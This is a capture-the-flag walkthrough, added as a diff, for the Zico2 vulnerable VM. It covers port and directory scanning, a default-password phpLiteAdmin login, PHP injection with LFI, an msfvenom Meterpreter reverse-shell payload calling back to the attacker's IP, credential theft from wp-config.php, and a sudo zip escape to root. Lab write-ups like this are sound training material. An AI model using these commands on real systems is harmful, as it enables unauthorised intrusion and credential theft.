@@ -1,0 +1,50 @@
+
+Hack the Zico2 VM (CTF Challenge)
+
+Hello friends! Today we are going to take another CTF challenge known as Zico2. The credit for making this vm machine goes to “Rafael” and it is another boot2root challenge, where we have to root the system to complete the challenge. You can download this VM here.
+Let’s Breach!!!
+Let us start form getting to know the IP of VM (Here, I have it at 192.168.0.26 but you will have to find our own)
+netdiscover
+
+Use nmap for port enumeration.
+nmap -sV 192.168.0.26
+
+We find port 80 is open, so we open this ip in our browser.
+
+Browsing through the site we find that, this site is vulnerable to LFI.
+
+We couldn’t find anything special here so we use dirb to find directories.
+dirb http://192.168.0.26/
+
+We found an interesting link called dbadmin. We open it in our browser.
+
+When we open this page we find another link; this link leads us to phpliteadmin login page.
+
+We tried the password” admin”, and it granted us access.
+
+We find that this version of phpliteadmin is vulnerable to php code injection.
+So we create another database and named it shell.php we use this database to inject php code.
+
+After we inject our code we use LFI to execute our shell. Here we can see that ls command was executed when we execute our shell.
+
+Now we create executable file using msfvenom.
+msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.0.25 lport=4444 -f elf > /root/Desktop/shell
+
+We move it to /var/www/html/ and then setup our listener on metasploit.
+
+We then use php code injection to upload our file to the server make it executable, and execute the file.
+
+We execute the php code using LFI and get a reverse shell.
+
+After searching through the files we find password for user zico in /home/zico/worpress/wp-config.php
+
+We use this password to login through ssh.
+
+After searching through the files, we take loot at the sudoers and find that we are allowed to use a few commands as root.
+
+Now we move to /tmp folder and find a few files that we had uploaded. We use zip to gain root privilege by executing shell command along with zip.
+sudo -u root zip shell.zip shell.py -T -unzip-command=”sh -c /bin/bash
+
+After gaining root privilege we move to root folder. Inside the root folder we find a file called flag.txt when we open the file. We get greeted by a message congratulating for the completion of the challenge.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
